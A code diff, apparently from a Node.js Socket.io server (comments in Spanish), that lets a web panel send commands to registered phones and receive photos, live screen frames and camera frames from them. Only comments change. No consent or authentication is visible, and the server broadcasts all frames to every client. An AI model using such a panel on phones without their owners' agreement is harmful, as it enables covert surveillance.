@@ -8,15 +8,14 @@ const io = new Server(server);
 
 app.use(express.static('public'));
 
-let connectedDevices = new Map(); // Guardará socket.id -> info del celular
+let connectedDevices = new Map();
 
 io.on('connection', (socket) => {
     console.log(`[+] Conexión establecida: ${socket.id}`);
 
-    // 👇 AGREGA ESTO: Si alguien abre la web, envíale inmediatamente la lista de los que ya están conectados
+    // Enviar lista actual al abrir el panel web
     socket.emit('update_devices', Array.from(connectedDevices.values()));
-    
-    // El celular se registra al abrir la app
+
     socket.on('register_phone', (data) => {
         connectedDevices.set(socket.id, {
             id: socket.id,
@@ -27,7 +26,6 @@ io.on('connection', (socket) => {
         io.emit('update_devices', Array.from(connectedDevices.values()));
     });
 
-    // Enviar comando dirigido a un celular específico desde el panel web (incluyendo parámetros extra como la lente)
     socket.on('send_command_to_device', (data) => {
         console.log(`[>] Enviando comando (${data.action}) al celular: ${data.targetId}`);
         io.to(data.targetId).emit('command_to_phone', { 
@@ -36,18 +34,18 @@ io.on('connection', (socket) => {
         });
     });
 
-    // Recibir la respuesta del celular (ej. la foto) y mandarla a la web
     socket.on('phone_response', (response) => {
         console.log(`[<] Respuesta recibida del celular: ${socket.id}`);
+        // Mandamos la respuesta dirigida para que el panel sepa de qué celular vino
         io.emit('phone_response', { ...response, deviceId: socket.id });
     });
 
-    // Transmisión de pantalla en tiempo real
+    // Transmisión de pantalla filtrada por ID de dispositivo
     socket.on('screen_frame', (base64Frame) => {
         io.emit('screen_frame', { deviceId: socket.id, frame: base64Frame });
     });
 
-    // Transmisión de cámara en tiempo real
+    // Transmisión de cámara filtrada por ID de dispositivo
     socket.on('camera_frame', (base64Frame) => {
         io.emit('camera_frame', { deviceId: socket.id, frame: base64Frame });
     });
